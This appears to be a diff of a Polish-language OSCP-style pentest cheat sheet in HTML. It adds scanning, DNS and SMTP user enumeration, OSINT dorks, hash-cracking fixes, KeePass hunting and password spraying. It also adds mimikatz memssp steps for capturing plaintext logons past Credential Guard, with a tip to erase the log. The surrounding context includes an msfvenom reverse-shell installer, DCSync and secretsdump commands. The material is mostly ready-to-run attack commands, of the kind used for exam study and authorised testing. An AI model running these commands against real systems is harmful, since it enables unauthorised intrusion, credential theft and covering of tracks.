@@ -196,7 +196,9 @@ fping -a -g 10.10.10.0/24 2&gt;/dev/null              # szybsza alternatywa" id=
 <div class="code"><button class="copy" type="button" aria-label="Kopiuj"><span class="ico">⧉</span><span class="lbl">copy</span></button><pre><code>nmap -sn 10.10.10.0/24 -oN live_hosts.txt          # -sn = ping scan, no ports
 fping -a -g 10.10.10.0/24 2&gt;/dev/null              # szybsza alternatywa</code></pre></div></section><section class="card" data-text="1.2 port scanning — nmap pełny, dokładny skan (mój domyślny): nmap --privileged -p- -sv -sc -t4 -v -on nmap_pelen_skan.txt $ip
 # -p-  wszystkie 65535 portów | -sv wersje | -sc skrypty default | -t4 szybko | -on zapis **trik dwuetapowy (szybko → głęboko)** — najpierw znajdź otwarte porty, potem skanuj tylko je: ports=$(nmap -p- --min-rate=1000 -t4 $ip | grep &#x27;^[0-9]&#x27; | cut -d/ -f1 | tr &#x27;\n&#x27; &#x27;,&#x27; | sed s/,$//)
-nmap -p$ports -sv -sc -a -on nmap_deep.txt $ip udp (wolne — celuj w konkretne porty; snmp/dns/tftp/ike): sudo nmap -su --top-ports 20 -on nmap_udp.txt $ip kategorie skryptów nse (świetne do enumeracji): nmap -p445 --script smb-enum-shares $ip           # które share dają rw
+nmap -p$ports -sv -sc -a -on nmap_deep.txt $ip udp (wolne — celuj w konkretne porty; snmp/dns/tftp/ike): sudo nmap -su --top-ports 20 -on nmap_udp.txt $ip **wybór typu skanu:** `-ss` (syn/half-open, domyślny gdy root — szybki, cichy) · `-st` (connect, bez roota/przez proxy — wolniejszy, wpada w logi apki) · `-pn` (host blokuje icmp → traktuj jako up) · `-o --osscan-guess` (fingerprint os ze stacku tcp/ip). **sweep całej podsieci (greppable `-og` → potok):** nmap -v -sn 192.168.50.1-253 -og ping-sweep.txt &amp;&amp; grep up ping-sweep.txt | cut -d&quot; &quot; -f2   # lista żywych
+nmap -p80,443 192.168.50.1-253 -og web-sweep.txt &amp;&amp; grep open web-sweep.txt | cut -d&quot; &quot; -f2  # kto ma web **netcat fallback (gdy brak nmapa na hoście):** nc -nvv -w 1 -z $ip 3388-3390          # tcp: &#x27;open&#x27; vs &#x27;refused&#x27; (rst); -z zero-i/o, -w1 timeout
+nc -nv -u -z -w 1 $ip 120-123          # udp: brak odpowiedzi=open, icmp unreachable=closed kategorie skryptów nse (świetne do enumeracji): nmap -p445 --script smb-enum-shares $ip           # które share dają rw
 nmap -v -p 139,445 --script smb $ip               # cała rodzina skryptów smb
 nmap -p445 --script &quot;vuln&quot; $ip                     # znane podatności
 ls /usr/share/nmap/scripts/ | grep smb             # przegląd dostępnych skryptów" id="p1-recon-enumeration-rozpoznanie-12-port-scanning-nmap"><h3 class="card-h">1.2 Port scanning — Nmap</h3><p>Pełny, dokładny skan (mój domyślny):</p>
@@ -207,6 +209,13 @@ ls /usr/share/nmap/scripts/ | grep smb             # przegląd dostępnych skryp
 nmap -p$ports -sV -sC -A -oN nmap_deep.txt $IP</code></pre></div>
 <p>UDP (wolne — celuj w konkretne porty; SNMP/DNS/TFTP/IKE):</p>
 <div class="code"><button class="copy" type="button" aria-label="Kopiuj"><span class="ico">⧉</span><span class="lbl">copy</span></button><pre><code>sudo nmap -sU --top-ports 20 -oN nmap_udp.txt $IP</code></pre></div>
+<p><strong>Wybór typu skanu:</strong> <code>-sS</code> (SYN/half-open, domyślny gdy root — szybki, cichy) · <code>-sT</code> (connect, bez roota/przez proxy — wolniejszy, wpada w logi apki) · <code>-Pn</code> (host blokuje ICMP → traktuj jako up) · <code>-O --osscan-guess</code> (fingerprint OS ze stacku TCP/IP).</p>
+<p><strong>Sweep całej podsieci (greppable <code>-oG</code> → potok):</strong></p>
+<div class="code"><button class="copy" type="button" aria-label="Kopiuj"><span class="ico">⧉</span><span class="lbl">copy</span></button><pre><code>nmap -v -sn 192.168.50.1-253 -oG ping-sweep.txt &amp;&amp; grep Up ping-sweep.txt | cut -d&quot; &quot; -f2   # lista żywych
+nmap -p80,443 192.168.50.1-253 -oG web-sweep.txt &amp;&amp; grep open web-sweep.txt | cut -d&quot; &quot; -f2  # kto ma web</code></pre></div>
+<p><strong>Netcat fallback (gdy brak nmapa na hoście):</strong></p>
+<div class="code"><button class="copy" type="button" aria-label="Kopiuj"><span class="ico">⧉</span><span class="lbl">copy</span></button><pre><code>nc -nvv -w 1 -z $IP 3388-3390          # TCP: &#x27;open&#x27; vs &#x27;refused&#x27; (RST); -z zero-I/O, -w1 timeout
+nc -nv -u -z -w 1 $IP 120-123          # UDP: brak odpowiedzi=open, ICMP unreachable=closed</code></pre></div>
 <p>Kategorie skryptów NSE (świetne do enumeracji):</p>
 <div class="code"><button class="copy" type="button" aria-label="Kopiuj"><span class="ico">⧉</span><span class="lbl">copy</span></button><pre><code>nmap -p445 --script smb-enum-shares $IP           # które share dają RW
 nmap -v -p 139,445 --script smb $IP               # cała rodzina skryptów SMB
@@ -240,11 +249,34 @@ ffuf -u &quot;http://$IP/page?FUZZ=1&quot; -w /usr/share/seclists/Discovery/Web-
 dnsrecon -d $domain -t std                          # standard
 dnsrecon -d $domain -d ~/wordlist.txt -t brt        # brute subdomen
 # strefowy transfer (jackpot, jeśli zadziała):
-dig axfr @$ip $domain" id="p1-recon-enumeration-rozpoznanie-14-dns"><h3 class="card-h">1.4 DNS</h3><div class="code"><button class="copy" type="button" aria-label="Kopiuj"><span class="ico">⧉</span><span class="lbl">copy</span></button><pre><code>dnsenum $DOMAIN
+dig axfr @$ip $domain
+# lekko/ręcznie:
+host -t mx $domain; host -t txt $domain              # mx (niższy numer=wyższy priorytet), txt (tokeny/hinty)
+for n in $(cat list.txt); do host $n.$domain; done | grep -v &quot;not found&quot;   # forward brute
+gobuster dns -d $domain -w wordlist.txt -t 10        # (gobuster &gt;3.6: --do zamiast -d) forward-brute daje rozrzucone ip w tym zakresie → potem reverse-ptr sweep tego /24 = kolejne nazwane hosty (rekon jest **cykliczny**). 1.4b pasywny osint (zanim dotkniesz celu) ⚠️ na egzaminie oscp faza pasywna prawie się nie liczy (brak internetowego osint) — na realnym teście jednak seeduje userów/maile i netbloki. whois $domain -h &lt;whois_ip&gt;            # registrant/admin: name+org+phone+email + name servery
+whois $ip -h &lt;whois_ip&gt;                # reverse → isp/cidr (kolejne cele skanów) **google dorks:** `site:cel.com filetype:txt` · `intitle:&quot;index of&quot;` · `site:cel.com inurl:admin` · `site:cel.com &quot;username&quot; &quot;password&quot;` · `site:cel.com -www` (subdomeny). **third-party (niski footprint):** netcraft/wappalyzer (stack), shodan (`hostname:cel.com` → banner+cve), securityheaders.com, ssllabs.com. **sekrety w repo:** `gitleaks detect --source &lt;repo&gt;`, `gitrob &lt;org&gt;` (regex+entropia; zwykle potrzeba pat). 1.4c windows lolbas recon (assumed breach — bez kali, bez internetu) na zablokowanym hoście ad robisz dns + skan portów **wbudowanym windowsem**. kluczowe egzaminacyjnie. nslookup mail.corp.com                                 # a; -type=txt/mx &lt;host&gt; &lt;dns-server&gt;
+test-netconnection -port 445 192.168.50.151            # tcptestsucceeded:true = open (icmp+1 port)
+1..1024 | % { echo ((new-object net.sockets.tcpclient).connect(&quot;10.10.10.5&quot;,$_)) &quot;port $_ open&quot; } 2&gt;$null   # lekki skan portów net view \\dc01 /all                                   :: share&#x27;y (admin$/c$/ipc$) + komentarze" id="p1-recon-enumeration-rozpoznanie-14-dns"><h3 class="card-h">1.4 DNS</h3><div class="code"><button class="copy" type="button" aria-label="Kopiuj"><span class="ico">⧉</span><span class="lbl">copy</span></button><pre><code>dnsenum $DOMAIN
 dnsrecon -d $DOMAIN -t std                          # standard
 dnsrecon -d $DOMAIN -D ~/wordlist.txt -t brt        # brute subdomen
 # Strefowy transfer (jackpot, jeśli zadziała):
-dig axfr @$IP $DOMAIN</code></pre></div></section><section class="card" data-text="1.5 smb / netbios (porty 139, 445) port **139** = netbios (stare, komunikacja w lan); port **445** = smb. sudo nbtscan -r 10.10.10.0/24                       # -r skanuje netbios 137 listowanie i anonimowe logowanie: smbclient -l //$ip -n                               # -n = null session (bez hasła)
+dig axfr @$IP $DOMAIN
+# Lekko/ręcznie:
+host -t mx $DOMAIN; host -t txt $DOMAIN              # MX (niższy numer=wyższy priorytet), TXT (tokeny/hinty)
+for n in $(cat list.txt); do host $n.$DOMAIN; done | grep -v &quot;not found&quot;   # forward brute
+gobuster dns -d $DOMAIN -w wordlist.txt -t 10        # (gobuster &gt;3.6: --do zamiast -d)</code></pre></div>
+<blockquote>Forward-brute daje rozrzucone IP w tym zakresie → potem reverse-PTR sweep tego /24 = kolejne nazwane hosty (rekon jest <strong>cykliczny</strong>).</blockquote>
+<h4 class="leaf">1.4b Pasywny OSINT (zanim dotkniesz celu)</h4>
+<blockquote>⚠️ Na egzaminie OSCP faza pasywna prawie się nie liczy (brak internetowego OSINT) — na realnym teście jednak seeduje userów/maile i netbloki.</blockquote>
+<div class="code"><button class="copy" type="button" aria-label="Kopiuj"><span class="ico">⧉</span><span class="lbl">copy</span></button><pre><code>whois $DOMAIN -h &lt;whois_ip&gt;            # Registrant/Admin: name+org+phone+email + Name Servery
+whois $IP -h &lt;whois_ip&gt;                # reverse → ISP/CIDR (kolejne cele skanów)</code></pre></div>
+<blockquote><strong>Google dorks:</strong> <code>site:cel.com filetype:txt</code> · <code>intitle:&quot;index of&quot;</code> · <code>site:cel.com inurl:admin</code> · <code>site:cel.com &quot;username&quot; &quot;password&quot;</code> · <code>site:cel.com -www</code> (subdomeny). <strong>Third-party (niski footprint):</strong> Netcraft/Wappalyzer (stack), Shodan (<code>hostname:cel.com</code> → banner+CVE), securityheaders.com, ssllabs.com. <strong>Sekrety w repo:</strong> <code>gitleaks detect --source &lt;repo&gt;</code>, <code>gitrob &lt;org&gt;</code> (regex+entropia; zwykle potrzeba PAT).</blockquote>
+<h4 class="leaf">1.4c Windows LOLBAS recon (assumed breach — bez Kali, bez internetu)</h4>
+<blockquote>Na zablokowanym hoście AD robisz DNS + skan portów <strong>wbudowanym Windowsem</strong>. Kluczowe egzaminacyjnie.</blockquote>
+<div class="code"><button class="copy" type="button" aria-label="Kopiuj"><span class="ico">⧉</span><span class="lbl">copy</span></button><pre><code>nslookup mail.corp.com                                 # A; -type=TXT/MX &lt;host&gt; &lt;dns-server&gt;
+Test-NetConnection -Port 445 192.168.50.151            # TcpTestSucceeded:True = open (ICMP+1 port)
+1..1024 | % { echo ((New-Object Net.Sockets.TcpClient).Connect(&quot;10.10.10.5&quot;,$_)) &quot;port $_ open&quot; } 2&gt;$null   # lekki skan portów</code></pre></div>
+<div class="code"><button class="copy" type="button" aria-label="Kopiuj"><span class="ico">⧉</span><span class="lbl">copy</span></button><pre><code>net view \\dc01 /all                                   :: share&#x27;y (ADMIN$/C$/IPC$) + komentarze</code></pre></div></section><section class="card" data-text="1.5 smb / netbios (porty 139, 445) port **139** = netbios (stare, komunikacja w lan); port **445** = smb. sudo nbtscan -r 10.10.10.0/24                       # -r skanuje netbios 137 listowanie i anonimowe logowanie: smbclient -l //$ip -n                               # -n = null session (bez hasła)
 smbclient //$ip/share_name -n                       # podłącz się do konkretnego share
 smbmap -h $ip                                        # pokazuje uprawnienia r/w per share
 smbmap -h $ip -u guest                               # spróbuj z kontem guest enum4linux-ng (users, groups, shares, policy, rid cycling): enum4linux-ng -a $ip -oa results/scan
@@ -255,7 +287,9 @@ crackmapexec smb $ip -u user -p pass --sam           # dump sam (jeśli admin)
 # wskazówka: (pwn3d!) w outputcie = masz admina na tym hoscie rpcclient (msrpc przez smb) rpcclient -u &quot;&quot; $ip -n                                # -u &quot;&quot; pusty user, -n bez hasła (anon) wewnątrz konsoli: `enumdomusers`, `enumdomgroups`, `queryuser 0x1f4`, `queryuser &lt;rid&gt;`. rid **500** = administrator, **501** = guest, **512-514** = domain admins/users/guests. konta użytkowników zwykle od **1000** w górę. rid cycling (wyciągnij userów po rid-ach): for i in $(seq 500 2000); do \
   user=$(echo &quot;queryuser $i&quot; | rpcclient -u &quot;&quot; -n $ip 2&gt;/dev/null | grep -i &quot;user name&quot;); \
   if [ -n &quot;$user&quot; ]; then echo &quot;[rid: $i] $user&quot;; fi; done wycinanie userów z outputu enumdomusers (`[nazwa]` → users.txt): awk -f&#x27;[][]&#x27; &#x27;{print $2}&#x27; rpc_wynik.txt &gt; users.txt
-# -f&#x27;[][]&#x27; ustawia [ oraz ] jako separatory | print $2 = to co między pierwszym [ a ]" id="p1-recon-enumeration-rozpoznanie-15-smb-netbios-porty-139-445"><h3 class="card-h">1.5 SMB / NetBIOS (porty 139, 445)</h3><blockquote>Port <strong>139</strong> = NetBIOS (stare, komunikacja w LAN); port <strong>445</strong> = SMB.</blockquote>
+# -f&#x27;[][]&#x27; ustawia [ oraz ] jako separatory | print $2 = to co między pierwszym [ a ] 1.5b smtp (port 25) — enum userów nc -nv $ip 25                          # po połączeniu:
+vrfy root                              # 252 = akceptowany/prawdopodobny · 550 = unknown (skryptuj po userliście)
+# expn &lt;lista&gt; = członkowie listy mailingowej; windows bez kali: dism /online /enable-feature /featurename:telnetclient → telnet $ip 25 `252` nie potwierdza usera w 100% (serwer bywa „accept-and-attempt&quot;), ale zawęża listę do sprayingu/phishingu." id="p1-recon-enumeration-rozpoznanie-15-smb-netbios-porty-139-445"><h3 class="card-h">1.5 SMB / NetBIOS (porty 139, 445)</h3><blockquote>Port <strong>139</strong> = NetBIOS (stare, komunikacja w LAN); port <strong>445</strong> = SMB.</blockquote>
 <div class="code"><button class="copy" type="button" aria-label="Kopiuj"><span class="ico">⧉</span><span class="lbl">copy</span></button><pre><code>sudo nbtscan -r 10.10.10.0/24                       # -r skanuje NetBIOS 137</code></pre></div>
 <p>Listowanie i anonimowe logowanie:</p>
 <div class="code"><button class="copy" type="button" aria-label="Kopiuj"><span class="ico">⧉</span><span class="lbl">copy</span></button><pre><code>smbclient -L //$IP -N                               # -N = null session (bez hasła)
@@ -281,7 +315,12 @@ crackmapexec smb $IP -u user -p pass --sam           # dump SAM (jeśli admin)
   if [ -n &quot;$user&quot; ]; then echo &quot;[RID: $i] $user&quot;; fi; done</code></pre></div>
 <p>Wycinanie userów z outputu enumdomusers (<code>[nazwa]</code> → users.txt):</p>
 <div class="code"><button class="copy" type="button" aria-label="Kopiuj"><span class="ico">⧉</span><span class="lbl">copy</span></button><pre><code>awk -F&#x27;[][]&#x27; &#x27;{print $2}&#x27; rpc_wynik.txt &gt; users.txt
-# -F&#x27;[][]&#x27; ustawia [ oraz ] jako separatory | print $2 = to co między pierwszym [ a ]</code></pre></div></section><section class="card" data-text="1.6 snmp (port 161/udp) mib table zawiera kody oid. community string domyślnie `public` (read). snmpwalk -c public -v1 -t 10 $ip                      # cały mib tree (-t 10 = timeout 10s)
+# -F&#x27;[][]&#x27; ustawia [ oraz ] jako separatory | print $2 = to co między pierwszym [ a ]</code></pre></div>
+<h4 class="leaf">1.5b SMTP (port 25) — enum userów</h4>
+<div class="code"><button class="copy" type="button" aria-label="Kopiuj"><span class="ico">⧉</span><span class="lbl">copy</span></button><pre><code>nc -nv $IP 25                          # po połączeniu:
+VRFY root                              # 252 = akceptowany/prawdopodobny · 550 = unknown (skryptuj po userliście)
+# EXPN &lt;lista&gt; = członkowie listy mailingowej; Windows bez Kali: dism /online /Enable-Feature /FeatureName:TelnetClient → telnet $IP 25</code></pre></div>
+<blockquote><code>252</code> nie potwierdza usera w 100% (serwer bywa „accept-and-attempt&quot;), ale zawęża listę do sprayingu/phishingu.</blockquote></section><section class="card" data-text="1.6 snmp (port 161/udp) mib table zawiera kody oid. community string domyślnie `public` (read). snmpwalk -c public -v1 -t 10 $ip                      # cały mib tree (-t 10 = timeout 10s)
 snmpwalk -c public -v1 $ip 1.3.6.1.4.1.77.1.2.25       # konta użytkowników
 snmpwalk -c public -v1 $ip 1.3.6.1.2.1.25.4.2.1.2      # uruchomione procesy
 snmpwalk -c public -v1 $ip 1.3.6.1.2.1.25.6.3.1.2      # zainstalowane oprogramowanie
@@ -1183,11 +1222,15 @@ reg query HKLM\Software\Policies\Microsoft\Windows\Installer /v AlwaysInstallEle
 <div class="code"><button class="copy" type="button" aria-label="Kopiuj"><span class="ico">⧉</span><span class="lbl">copy</span></button><pre><code>msfvenom -p windows/x64/shell_reverse_tcp LHOST=$LHOST LPORT=4444 -f msi -o evil.msi
 # na celu:  msiexec /quiet /qn /i evil.msi</code></pre></div></section></div></section><section class="phase" id="p5-credential-access-pozyskiwanie-poświadczeń" data-phase="p5-credential-access-pozyskiwanie-poświadczeń" style="--hue:#a78bfa"><header class="phase-head"><button class="collapse" type="button" aria-label="Zwiń"></button><span class="badge">5</span><h2>Credential Access (Pozyskiwanie poświadczeń)</h2><span class="tag">Creds</span></header><div class="phase-body"><section class="card" data-text="5.1 łamanie hashy john the ripper john --wordlist=/usr/share/wordlists/rockyou.txt hashes.txt
 john --show hashes.txt                                  # pokaż złamane
-# automatyczne rozpoznanie typu: john potrafi zgadnąć, ale przy ad zwykle podajesz format ręcznie hashcat (szybszy, gpu) hashcat -m 18200 hashes.txt /usr/share/wordlists/rockyou.txt    # -m = typ hasha `-m` typ 0 md5 100 sha1 1000 ntlm 1800 sha512crypt (/etc/shadow) 3200 bcrypt 5600 netntlmv2 (responder) 13100 kerberoast (tgs-rep) 18200 as-rep roast hashcat --example-hashes | grep -ia2 &quot;ntlm&quot;             # gdy nie znasz numeru -m identyfikacja typu hasha przed łamaniem: `hashid &#x27;&lt;hash&gt;&#x27;` lub `nth --text &#x27;&lt;hash&gt;&#x27;`. ekstrakcja hasha z pliku (`*2john`) ssh2john id_rsa &gt; ssh.hash             # zaszyfrowany klucz prywatny ssh → hash
-keepass2john database.kdbx &gt; kp.hash   # baza keepass → hash
+# automatyczne rozpoznanie typu: john potrafi zgadnąć, ale przy ad zwykle podajesz format ręcznie hashcat (szybszy, gpu) hashcat -m 18200 hashes.txt /usr/share/wordlists/rockyou.txt    # -m = typ hasha `-m` typ 0 md5 100 sha1 1000 ntlm 1800 sha512crypt (/etc/shadow) 3200 bcrypt 5600 netntlmv2 (responder) 13100 kerberoast (tgs-rep) 18200 as-rep roast hashcat --example-hashes | grep -ia2 &quot;ntlm&quot;             # gdy nie znasz numeru -m identyfikacja typu hasha przed łamaniem: `hashid &#x27;&lt;hash&gt;&#x27;` lub `nth --text &#x27;&lt;hash&gt;&#x27;`. ekstrakcja hasha z pliku (`*2john`) ssh2john id_rsa | sed &#x27;s/^[^:]*://&#x27; &gt; ssh.hash    # zdejmij prefiks &#x27;id_rsa:&#x27; — inaczej hashcat nie ładuje/łamie śmieci!
+keepass2john database.kdbx | sed &#x27;s/^[^:]*://&#x27; &gt; kp.hash   # to samo: usuwa prefiks &#x27;database:&#x27;
 zip2john plik.zip &gt; zip.hash           # (analogicznie: office2john, gpg2john, pdf2john)
-hashcat -m 22921 ssh.hash /usr/share/wordlists/rockyou.txt -r ssh.rule   # klucz ssh
-hashcat -m 13400 kp.hash  /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/rockyou-30000.rule   # keepass dodatkowe tryby `-m`: **13400** keepass · **22921** klucz ssh · **11600** 7-zip · **13600** zip · **9600** office 2013+ · **7500** kerberos as-req (etype 23). password spraying (1 hasło × wielu userów) **najpierw sprawdź politykę lockout**, policz bezpieczną liczbę prób: net accounts                          :: lockout threshold / observation window / min. długość hasła (na hoście domenowym) z kali / linuxa: crackmapexec smb $dc -u users.txt -p &#x27;sezon2024!&#x27; -d $domain --continue-on-success   # nxc = następca cme; &#x27;(pwn3d!)&#x27; = local admin!
+hashcat -m 13400 kp.hash  /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/rockyou-30000.rule   # keepass
+# znajdź bazy keepass na windows (bywa kilka — personal + dział):
+#   get-childitem -path c:\ -include *.kdbx -file -recurse -erroraction silentlycontinue ⚠️ **cichy killer:** `*2john` dokleja `nazwapliku:` (jako „username&quot;) na początku — obejrzyj hash gołym okiem, wytnij wszystko do pierwszego `:`. **klucz ssh:** `-m 22921` działa tylko dla `$6$`/sha-512; nowoczesny **aes-256-ctr → &quot;token length exception&quot;** → fallback do johna: ssh2john id_rsa &gt; ssh.hash
+john --wordlist=rockyou.txt ssh.hash &amp;&amp; john --show ssh.hash    # john ogarnia aes-256-ctr; chmod 600 id_rsa przed użyciem klucza dodatkowe tryby `-m`: **13400** keepass · **22921** klucz ssh · **11600** 7-zip · **13600** zip · **9600** office 2013+ · **7500** kerberos as-req (etype 23). **reguły hashcat pod znaną politykę** (z `note.txt` znasz wzorzec → zbuduj regułę ręcznie — często jedyna droga): echo &#x27;$1&#x27; &gt; demo.rule                              # składnia: $x dopisz na końcu · ^x na początku · c kapitalizuj · l/u lower/upper · r odwróć
+hashcat -r demo.rule --stdout wordlist.txt         # debug: pokaż kandydatów bez łamania (weryfikacja reguły)
+hashcat -m 0 hash.txt rockyou.txt -r demo.rule --force wiele funkcji w jednej linii = łączone: `$1 c $!` → `password1!`. każda linia = osobna mutacja. ludzki nawyk: kapitał na początku, cyfry, special na końcu (`! @ #`). escape w shellu: `echo \$1`. password spraying (1 hasło × wielu userów) **najpierw sprawdź politykę lockout**, policz bezpieczną liczbę prób: net accounts                          :: lockout threshold / observation window / min. długość hasła (na hoście domenowym) z kali / linuxa: crackmapexec smb $dc -u users.txt -p &#x27;sezon2024!&#x27; -d $domain --continue-on-success   # nxc = następca cme; &#x27;(pwn3d!)&#x27; = local admin!
 kerbrute passwordspray -d $domain users.txt &#x27;sezon2024!&#x27;          # przez kerberos (2 pakiety udp/próbę, najciszej) z hosta domenowego (windows): .\spray-passwords.ps1 -pass nexus123! -admin        # auto-enumeruje userów i sprayuje (-file = wordlista, -admin = też admini)
 # low-and-slow przez adsi (najmniej ruchu — 1 obiekt = 1 próba):
 $d=[system.directoryservices.activedirectory.domain]::getcurrentdomain(); $pdc=($d.pdcroleowner).name
@@ -1202,12 +1245,21 @@ john --show hashes.txt                                  # pokaż złamane
 <div class="code"><button class="copy" type="button" aria-label="Kopiuj"><span class="ico">⧉</span><span class="lbl">copy</span></button><pre><code>hashcat --example-hashes | grep -iA2 &quot;ntlm&quot;             # gdy nie znasz numeru -m</code></pre></div>
 <blockquote>Identyfikacja typu hasha przed łamaniem: <code>hashid &#x27;&lt;hash&gt;&#x27;</code> lub <code>nth --text &#x27;&lt;hash&gt;&#x27;</code>.</blockquote>
 <h4 class="leaf">Ekstrakcja hasha z pliku (<code>*2john</code>)</h4>
-<div class="code"><button class="copy" type="button" aria-label="Kopiuj"><span class="ico">⧉</span><span class="lbl">copy</span></button><pre><code>ssh2john id_rsa &gt; ssh.hash             # zaszyfrowany klucz prywatny SSH → hash
-keepass2john Database.kdbx &gt; kp.hash   # baza KeePass → hash
+<div class="code"><button class="copy" type="button" aria-label="Kopiuj"><span class="ico">⧉</span><span class="lbl">copy</span></button><pre><code>ssh2john id_rsa | sed &#x27;s/^[^:]*://&#x27; &gt; ssh.hash    # ZDEJMIJ prefiks &#x27;id_rsa:&#x27; — inaczej hashcat nie ładuje/łamie śmieci!
+keepass2john Database.kdbx | sed &#x27;s/^[^:]*://&#x27; &gt; kp.hash   # to samo: usuwa prefiks &#x27;Database:&#x27;
 zip2john plik.zip &gt; zip.hash           # (analogicznie: office2john, gpg2john, pdf2john)
-hashcat -m 22921 ssh.hash /usr/share/wordlists/rockyou.txt -r ssh.rule   # klucz SSH
-hashcat -m 13400 kp.hash  /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/rockyou-30000.rule   # KeePass</code></pre></div>
+hashcat -m 13400 kp.hash  /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/rockyou-30000.rule   # KeePass
+# Znajdź bazy KeePass na Windows (bywa kilka — personal + dział):
+#   Get-ChildItem -Path C:\ -Include *.kdbx -File -Recurse -ErrorAction SilentlyContinue</code></pre></div>
+<blockquote>⚠️ <strong>Cichy killer:</strong> <code>*2john</code> dokleja <code>nazwapliku:</code> (jako „username&quot;) na początku — obejrzyj hash gołym okiem, wytnij wszystko do pierwszego <code>:</code>. <strong>Klucz SSH:</strong> <code>-m 22921</code> działa TYLKO dla <code>$6$</code>/SHA-512; nowoczesny <strong>aes-256-ctr → &quot;Token length exception&quot;</strong> → fallback do Johna:</blockquote>
+<div class="code"><button class="copy" type="button" aria-label="Kopiuj"><span class="ico">⧉</span><span class="lbl">copy</span></button><pre><code>ssh2john id_rsa &gt; ssh.hash
+john --wordlist=rockyou.txt ssh.hash &amp;&amp; john --show ssh.hash    # John ogarnia aes-256-ctr; chmod 600 id_rsa przed użyciem klucza</code></pre></div>
 <blockquote>Dodatkowe tryby <code>-m</code>: <strong>13400</strong> KeePass · <strong>22921</strong> klucz SSH · <strong>11600</strong> 7-Zip · <strong>13600</strong> ZIP · <strong>9600</strong> Office 2013+ · <strong>7500</strong> Kerberos AS-REQ (etype 23).</blockquote>
+<p><strong>Reguły hashcat pod znaną politykę</strong> (z <code>note.txt</code> znasz wzorzec → zbuduj regułę ręcznie — często jedyna droga):</p>
+<div class="code"><button class="copy" type="button" aria-label="Kopiuj"><span class="ico">⧉</span><span class="lbl">copy</span></button><pre><code>echo &#x27;$1&#x27; &gt; demo.rule                              # składnia: $X dopisz na końcu · ^X na początku · c Kapitalizuj · l/u lower/upper · r odwróć
+hashcat -r demo.rule --stdout wordlist.txt         # DEBUG: pokaż kandydatów bez łamania (weryfikacja reguły)
+hashcat -m 0 hash.txt rockyou.txt -r demo.rule --force</code></pre></div>
+<blockquote>Wiele funkcji w jednej linii = łączone: <code>$1 c $!</code> → <code>Password1!</code>. Każda linia = osobna mutacja. Ludzki nawyk: Kapitał na początku, cyfry, special na końcu (<code>! @ #</code>). Escape w shellu: <code>echo \$1</code>.</blockquote>
 <h4 class="leaf">Password spraying (1 hasło × wielu userów)</h4>
 <blockquote><strong>Najpierw sprawdź politykę lockout</strong>, policz bezpieczną liczbę prób:</blockquote>
 <div class="code"><button class="copy" type="button" aria-label="Kopiuj"><span class="ico">⧉</span><span class="lbl">copy</span></button><pre><code>net accounts                          :: Lockout threshold / observation window / min. długość hasła (na hoście domenowym)</code></pre></div>
@@ -1226,8 +1278,9 @@ token::elevate
 lsadump::sam dump ntlm z pamięci lsass privilege::debug
 token::elevate
 sekurlsa::msv klucze kerberos (do pass-the-key) privilege::debug
-sekurlsa::ekeys dcsync (wyciągnij hash dowolnego usera z dc — wymaga uprawnień replikacji) lsadump::dcsync /domain:za.tryhackme.com /user:administrator memssp (ssp backdoor — zapis plaintext haseł przy logowaniu) privilege::debug
-misc::memssp secretsdump (linux/impacket — alternatywa bez wchodzenia na hosta) impacket-secretsdump $domain/user:password@$ip           # zdalny dump sam+lsa+ntds
+sekurlsa::ekeys dcsync (wyciągnij hash dowolnego usera z dc — wymaga uprawnień replikacji) lsadump::dcsync /domain:za.tryhackme.com /user:administrator memssp (ssp backdoor — plaintext przy logowaniu; obejście credential guard) privilege::debug
+misc::memssp get-computerinfo | select deviceguardsecurityservicesrunning   # zawiera &#x27;credentialguard&#x27; = lsass chroniony
+type c:\windows\system32\mimilsa.log                            # plaintext creds po memssp + następnym logowaniu **credential guard** blokuje zrzut lsass (`sekurlsa` pokazuje tylko „lsa isolated data&quot;) — ale chroni tylko konta **domenowe**; lokalne z sam (`lsadump::sam`) zrzucasz normalnie. `memssp` wstrzykuje ssp (bez dll na dysku) i łapie plaintext przy **kolejnym** logowaniu (poczekaj / wymuś rdp). opsec: `mimilsa.log` to plaintext na dysku — posprzątaj. secretsdump (linux/impacket — alternatywa bez wchodzenia na hosta) impacket-secretsdump $domain/user:password@$ip           # zdalny dump sam+lsa+ntds
 impacket-secretsdump -just-dc $domain/user:password@$dc   # dcsync przez sieć (całe ntds.dit)" id="p5-credential-access-pozyskiwanie-poświadczeń-52-mimikatz-windows-wymaga-adminasystem"><h3 class="card-h">5.2 Mimikatz (Windows, wymaga admina/SYSTEM)</h3><h4 class="leaf">Dump NTLM z lokalnego SAM</h4>
 <div class="code"><button class="copy" type="button" aria-label="Kopiuj"><span class="ico">⧉</span><span class="lbl">copy</span></button><pre><code>mimikatz
 privilege::debug
@@ -1242,9 +1295,12 @@ sekurlsa::msv</code></pre></div>
 sekurlsa::ekeys</code></pre></div>
 <h4 class="leaf">DCSync (wyciągnij hash dowolnego usera z DC — wymaga uprawnień replikacji)</h4>
 <div class="code"><button class="copy" type="button" aria-label="Kopiuj"><span class="ico">⧉</span><span class="lbl">copy</span></button><pre><code>lsadump::dcsync /domain:za.tryhackme.com /user:Administrator</code></pre></div>
-<h4 class="leaf">memssp (SSP backdoor — zapis plaintext haseł przy logowaniu)</h4>
+<h4 class="leaf">memssp (SSP backdoor — plaintext przy logowaniu; obejście Credential Guard)</h4>
 <div class="code"><button class="copy" type="button" aria-label="Kopiuj"><span class="ico">⧉</span><span class="lbl">copy</span></button><pre><code>privilege::debug
 misc::memssp</code></pre></div>
+<div class="code"><button class="copy" type="button" aria-label="Kopiuj"><span class="ico">⧉</span><span class="lbl">copy</span></button><pre><code>Get-ComputerInfo | Select DeviceGuardSecurityServicesRunning   # zawiera &#x27;CredentialGuard&#x27; = LSASS chroniony
+type C:\Windows\System32\mimilsa.log                            # plaintext creds po memssp + NASTĘPNYM logowaniu</code></pre></div>
+<blockquote><strong>Credential Guard</strong> blokuje zrzut LSASS (<code>sekurlsa</code> pokazuje tylko „LSA Isolated Data&quot;) — ale chroni TYLKO konta <strong>domenowe</strong>; lokalne z SAM (<code>lsadump::sam</code>) zrzucasz normalnie. <code>memssp</code> wstrzykuje SSP (bez DLL na dysku) i łapie plaintext przy <strong>kolejnym</strong> logowaniu (poczekaj / wymuś RDP). OPSEC: <code>mimilsa.log</code> to plaintext na dysku — posprzątaj.</blockquote>
